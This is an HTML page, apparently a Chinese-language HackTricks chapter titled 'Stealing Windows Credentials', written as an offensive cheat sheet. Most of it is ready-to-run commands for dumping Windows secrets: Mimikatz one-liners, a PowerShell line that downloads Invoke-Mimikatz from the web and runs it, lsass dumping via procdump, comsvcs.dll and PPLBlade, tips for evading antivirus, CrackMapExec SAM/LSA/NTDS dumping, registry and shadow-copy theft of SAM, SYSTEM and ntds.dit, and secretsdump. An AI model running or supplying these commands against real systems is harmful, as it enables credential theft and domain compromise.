<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stealing Windows Credentials</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="stealing-windows-credentials"><a class="header" href="#stealing-windows-credentials">Stealing Windows Credentials</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="credentials-mimikatz"><a class="header" href="#credentials-mimikatz">Credentials Mimikatz</a></h2>
<pre><code class="language-bash">#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
</code></pre>
<p><strong>在</strong> <a href="credentials-mimikatz.html"><strong>此页面</strong></a><strong>中查找Mimikatz可以做的其他事情。</strong></p>
<h3 id="invoke-mimikatz"><a class="header" href="#invoke-mimikatz">Invoke-Mimikatz</a></h3>
<pre><code class="language-bash">IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
</code></pre>
<p><a href="credentials-protections.html"><strong>在这里了解一些可能的凭据保护措施。</strong></a> <strong>这些保护措施可以防止 Mimikatz 提取某些凭据。</strong></p>
<h2 id="使用-meterpreter-的凭据"><a class="header" href="#使用-meterpreter-的凭据">使用 Meterpreter 的凭据</a></h2>
<p>使用我创建的 <a href="https://github.com/carlospolop/MSF-Credentials"><strong>Credentials Plugin</strong></a> <strong>在受害者内部搜索密码和哈希。</strong></p>
<pre><code class="language-bash">#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
</code></pre>
<h2 id="绕过-av"><a class="header" href="#绕过-av">绕过 AV</a></h2>
<h3 id="procdump--mimikatz"><a class="header" href="#procdump--mimikatz">Procdump + Mimikatz</a></h3>
<p>由于 <strong>Procdump 来自</strong> <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"><strong>SysInternals</strong> </a><strong>是一个合法的 Microsoft 工具</strong>，因此不会被 Defender 检测到。<br />
您可以使用此工具来 <strong>转储 lsass 进程</strong>，<strong>下载转储文件</strong>并 <strong>从转储中提取</strong> <strong>凭据</strong>。</p>
<p>{% code title="Dump lsass" %}</p>
<pre><code class="language-bash">#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>{% endcode %}</p>
<p>{% code title="从转储中提取凭据" %}</p>
<pre><code class="language-c">//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
</code></pre>
<p>{% endcode %}</p>
<p>此过程通过 <a href="https://github.com/aas-n/spraykatz">SprayKatz</a> 自动完成： <code>./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24</code></p>
<p><strong>注意</strong>：某些 <strong>AV</strong> 可能会将 <strong>procdump.exe 用于转储 lsass.exe</strong> 视为 <strong>恶意</strong>，这是因为它们正在 <strong>检测</strong> 字符串 <strong>"procdump.exe" 和 "lsass.exe"</strong>。因此，将 <strong>lsass.exe 的 PID</strong> 作为参数传递给 procdump <strong>而不是</strong> <strong>lsass.exe 的名称</strong> 更加 <strong>隐蔽</strong>。</p>
<h3 id="使用-comsvcsdll-转储-lsass"><a class="header" href="#使用-comsvcsdll-转储-lsass">使用 <strong>comsvcs.dll</strong> 转储 lsass</a></h3>
<p>名为 <strong>comsvcs.dll</strong> 的 DLL 位于 <code>C:\Windows\System32</code>，负责在崩溃事件中 <strong>转储进程内存</strong>。此 DLL 包含一个名为 <strong><code>MiniDumpW</code></strong> 的 <strong>函数</strong>，旨在通过 <code>rundll32.exe</code> 调用。<br />
使用前两个参数是无关紧要的，但第三个参数分为三个部分。要转储的进程 ID 是第一部分，转储文件位置是第二部分，第三部分严格是单词 <strong>full</strong>。没有其他选项。<br />
解析这三个部分后，DLL 开始创建转储文件并将指定进程的内存转移到该文件中。<br />
利用 <strong>comsvcs.dll</strong> 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细信息可在 <a href="https://en.hackndo.com/remote-lsass-dump-passwords">https://en.hackndo.com/remote-lsass-dump-passwords/</a> 中找到。</p>
<p>以下命令用于执行：</p>
<pre><code class="language-bash">rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full
</code></pre>
<p><strong>您可以使用</strong> <a href="https://github.com/Hackndo/lsassy"><strong>lssasy</strong></a><strong>自动化此过程。</strong></p>
<h3 id="使用任务管理器转储-lsass"><a class="header" href="#使用任务管理器转储-lsass"><strong>使用任务管理器转储 lsass</strong></a></h3>
<ol>
<li>右键单击任务栏，然后单击任务管理器</li>
<li>单击更多详细信息</li>
<li>在进程选项卡中搜索“本地安全授权进程”</li>
<li>右键单击“本地安全授权进程”，然后单击“创建转储文件”。</li>
</ol>
<h3 id="使用-procdump-转储-lsass"><a class="header" href="#使用-procdump-转储-lsass">使用 procdump 转储 lsass</a></h3>
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> 是一个微软签名的二进制文件，是 <a href="https://docs.microsoft.com/en-us/sysinternals/">sysinternals</a> 套件的一部分。</p>
<pre><code>Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
</code></pre>
<h2 id="dumpin-lsass-with-pplblade"><a class="header" href="#dumpin-lsass-with-pplblade">Dumpin lsass with PPLBlade</a></h2>
<p><a href="https://github.com/tastypepperoni/PPLBlade"><strong>PPLBlade</strong></a> 是一个受保护进程转储工具，支持对内存转储进行混淆，并在不将其写入磁盘的情况下将其传输到远程工作站。</p>
<p><strong>主要功能</strong>：</p>
<ol>
<li>绕过 PPL 保护</li>
<li>混淆内存转储文件以规避 Defender 基于签名的检测机制</li>
<li>使用 RAW 和 SMB 上传方法上传内存转储，而不将其写入磁盘（无文件转储）</li>
</ol>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
</code></pre>
<p>{% endcode %}</p>
<h2 id="crackmapexec"><a class="header" href="#crackmapexec">CrackMapExec</a></h2>
<h3 id="转储-sam-哈希"><a class="header" href="#转储-sam-哈希">转储 SAM 哈希</a></h3>
<pre><code>cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
</code></pre>
<h3 id="转储-lsa-秘密"><a class="header" href="#转储-lsa-秘密">转储 LSA 秘密</a></h3>
<pre><code>cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
</code></pre>
<h3 id="从目标-dc-转储-ntdsdit"><a class="header" href="#从目标-dc-转储-ntdsdit">从目标 DC 转储 NTDS.dit</a></h3>
<pre><code>cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
</code></pre>
<h3 id="从目标-dc-转储-ntdsdit-密码历史记录"><a class="header" href="#从目标-dc-转储-ntdsdit-密码历史记录">从目标 DC 转储 NTDS.dit 密码历史记录</a></h3>
<pre><code>#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
</code></pre>
<h3 id="显示每个-ntdsdit-账户的-pwdlastset-属性"><a class="header" href="#显示每个-ntdsdit-账户的-pwdlastset-属性">显示每个 NTDS.dit 账户的 pwdLastSet 属性</a></h3>
<pre><code>#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
</code></pre>
<h2 id="stealing-sam--system"><a class="header" href="#stealing-sam--system">Stealing SAM &amp; SYSTEM</a></h2>
<p>这些文件应该<strong>位于</strong><em>C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM.</em> 但是<strong>你不能以常规方式复制它们</strong>，因为它们受到保护。</p>
<h3 id="from-registry"><a class="header" href="#from-registry">From Registry</a></h3>
<p>窃取这些文件的最简单方法是从注册表获取副本：</p>
<pre><code>reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
</code></pre>
<p><strong>下载</strong>这些文件到你的Kali机器，并使用以下命令<strong>提取哈希</strong>：</p>
<pre><code>samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
</code></pre>
<h3 id="卷影复制"><a class="header" href="#卷影复制">卷影复制</a></h3>
<p>您可以使用此服务复制受保护的文件。您需要是管理员。</p>
<h4 id="使用-vssadmin"><a class="header" href="#使用-vssadmin">使用 vssadmin</a></h4>
<p>vssadmin 二进制文件仅在 Windows Server 版本中可用。</p>
<pre><code class="language-bash">vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
</code></pre>
<p>但是你可以通过 <strong>Powershell</strong> 做同样的事情。这是 <strong>如何复制 SAM 文件</strong> 的一个例子（使用的硬盘是 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：</p>
<pre><code class="language-bash">$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
</code></pre>
<h3 id="invoke-ninjacopy"><a class="header" href="#invoke-ninjacopy">Invoke-NinjaCopy</a></h3>
<p>最后，您还可以使用 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1"><strong>PS 脚本 Invoke-NinjaCopy</strong></a> 来复制 SAM、SYSTEM 和 ntds.dit。</p>
<pre><code class="language-bash">Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
</code></pre>
<h2 id="active-directory-凭据---ntdsdit"><a class="header" href="#active-directory-凭据---ntdsdit"><strong>Active Directory 凭据 - NTDS.dit</strong></a></h2>
<p><strong>NTDS.dit</strong> 文件被称为 <strong>Active Directory</strong> 的核心，保存有关用户对象、组及其成员资格的重要数据。它是存储域用户的 <strong>密码哈希</strong> 的地方。该文件是一个 <strong>可扩展存储引擎 (ESE)</strong> 数据库，位于 <strong><em>%SystemRoom%/NTDS/ntds.dit</em></strong>。</p>
<p>在这个数据库中，维护着三个主要表：</p>
<ul>
<li><strong>数据表</strong>：该表负责存储有关用户和组等对象的详细信息。</li>
<li><strong>链接表</strong>：它跟踪关系，例如组成员资格。</li>
<li><strong>SD 表</strong>：每个对象的 <strong>安全描述符</strong> 存放在这里，确保存储对象的安全性和访问控制。</li>
</ul>
<p>有关更多信息：<a href="http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/">http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/</a></p>
<p>Windows 使用 <em>Ntdsa.dll</em> 与该文件进行交互，并由 <em>lsass.exe</em> 使用。然后，<strong>NTDS.dit</strong> 文件的一部分可能位于 <strong><code>lsass</code></strong> 内存中（您可以找到最近访问的数据，可能是由于使用 <strong>缓存</strong> 提高了性能）。</p>
<h4 id="解密-ntdsdit-中的哈希"><a class="header" href="#解密-ntdsdit-中的哈希">解密 NTDS.dit 中的哈希</a></h4>
<p>哈希被加密三次：</p>
<ol>
<li>使用 <strong>BOOTKEY</strong> 和 <strong>RC4</strong> 解密密码加密密钥 (<strong>PEK</strong>)。</li>
<li>使用 <strong>PEK</strong> 和 <strong>RC4</strong> 解密 <strong>哈希</strong>。</li>
<li>使用 <strong>DES</strong> 解密 <strong>哈希</strong>。</li>
</ol>
<p><strong>PEK</strong> 在 <strong>每个域控制器</strong> 中具有 <strong>相同的值</strong>，但它在 <strong>NTDS.dit</strong> 文件中使用 <strong>域控制器的 SYSTEM 文件的 BOOTKEY</strong> 进行 <strong>加密</strong>（在不同的域控制器之间是不同的）。这就是为什么要从 NTDS.dit 文件中获取凭据 <strong>您需要 NTDS.dit 和 SYSTEM 文件</strong> (<em>C:\Windows\System32\config\SYSTEM</em>)。</p>
<h3 id="使用-ntdsutil-复制-ntdsdit"><a class="header" href="#使用-ntdsutil-复制-ntdsdit">使用 Ntdsutil 复制 NTDS.dit</a></h3>
<p>自 Windows Server 2008 起可用。</p>
<pre><code class="language-bash">ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
</code></pre>
<p>您还可以使用 <a href="./#stealing-sam-and-system"><strong>卷影复制</strong></a> 技巧来复制 <strong>ntds.dit</strong> 文件。请记住，您还需要 <strong>SYSTEM 文件</strong> 的副本（同样，您可以 <a href="./#stealing-sam-and-system"><strong>从注册表转储或使用卷影复制</strong></a> 技巧）。</p>
<h3 id="从-ntdsdit-中提取哈希"><a class="header" href="#从-ntdsdit-中提取哈希"><strong>从 NTDS.dit 中提取哈希</strong></a></h3>
<p>一旦您 <strong>获得</strong> 了 <strong>NTDS.dit</strong> 和 <strong>SYSTEM</strong> 文件，您可以使用像 <em>secretsdump.py</em> 这样的工具来 <strong>提取哈希</strong>：</p>
<pre><code class="language-bash">secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
</code></pre>
<p>您还可以使用有效的域管理员用户<strong>自动提取它们</strong>：</p>
<pre><code>secretsdump.py -just-dc-ntlm &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;DOMAIN_CONTROLLER&gt;
</code></pre>
<p>对于 <strong>大 NTDS.dit 文件</strong>，建议使用 <a href="https://github.com/c-sto/gosecretsdump">gosecretsdump</a> 进行提取。</p>
<p>最后，您还可以使用 <strong>metasploit 模块</strong>：<em>post/windows/gather/credentials/domain_hashdump</em> 或 <strong>mimikatz</strong> <code>lsadump::lsa /inject</code></p>
<h3 id="从-ntdsdit-提取域对象到-sqlite-数据库"><a class="header" href="#从-ntdsdit-提取域对象到-sqlite-数据库"><strong>从 NTDS.dit 提取域对象到 SQLite 数据库</strong></a></h3>
<p>NTDS 对象可以使用 <a href="https://github.com/almandin/ntdsdotsqlite">ntdsdotsqlite</a> 提取到 SQLite 数据库中。不仅提取了秘密，还提取了整个对象及其属性，以便在原始 NTDS.dit 文件已被检索时进行进一步的信息提取。</p>
<pre><code>ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
</code></pre>
<p>The <code>SYSTEM</code> hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取以下数据：用户和机器账户及其哈希、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...</p>
<h2 id="lazagne"><a class="header" href="#lazagne">Lazagne</a></h2>
<p>从 <a href="https://github.com/AlessandroZ/LaZagne/releases">这里</a> 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。</p>
<pre><code>lazagne.exe all
</code></pre>
<h2 id="从sam和lsass提取凭据的其他工具"><a class="header" href="#从sam和lsass提取凭据的其他工具">从SAM和LSASS提取凭据的其他工具</a></h2>
<h3 id="windows凭据编辑器wce"><a class="header" href="#windows凭据编辑器wce">Windows凭据编辑器（WCE）</a></h3>
<p>此工具可用于从内存中提取凭据。下载地址：<a href="https://www.ampliasecurity.com/research/windows-credentials-editor/">http://www.ampliasecurity.com/research/windows-credentials-editor/</a></p>
<h3 id="fgdump"><a class="header" href="#fgdump">fgdump</a></h3>
<p>从SAM文件中提取凭据</p>
<pre><code>You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
</code></pre>
<h3 id="pwdump"><a class="header" href="#pwdump">PwDump</a></h3>
<p>从SAM文件中提取凭据</p>
<pre><code>You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
</code></pre>
<h3 id="pwdump7"><a class="header" href="#pwdump7">PwDump7</a></h3>
<p>从：<a href="http://www.tarasco.org/security/pwdump_7"> http://www.tarasco.org/security/pwdump_7</a> 下载并<strong>执行它</strong>，密码将被提取。</p>
<h2 id="防御"><a class="header" href="#防御">防御</a></h2>
<p><a href="credentials-protections.html"><strong>在这里了解一些凭证保护。</strong></a></p>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../windows-hardening/stealing-credentials/credentials-protections.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../https://cloud.hacktricks.xyz/pentesting-cloud/azure-security/az-lateral-movements.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../windows-hardening/stealing-credentials/credentials-protections.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
